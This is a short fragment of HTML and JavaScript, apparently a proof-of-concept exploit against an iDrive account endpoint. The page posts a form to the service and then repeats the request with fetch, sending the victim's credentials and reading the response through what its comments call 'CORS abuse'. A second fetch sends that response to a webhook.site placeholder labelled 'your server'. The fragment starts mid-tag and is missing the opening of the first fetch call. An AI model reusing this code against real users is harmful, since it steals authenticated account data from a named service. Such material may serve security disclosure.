          action="https://www.idrive.com/idrive/home/c2c/seat/details"
          method="POST">

    </form>

      // Step 2: Send same request via fetch to read response (CORS abuse)

        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "subuser=yes"
      })
      .then(res => res.text())
      .then(data => {
        // Step 3: Exfiltrate response to your server
        fetch("https://webhook.site/YOUR-UNIQUE-ID", {
          method: "POST",
          body: data
        });
      });
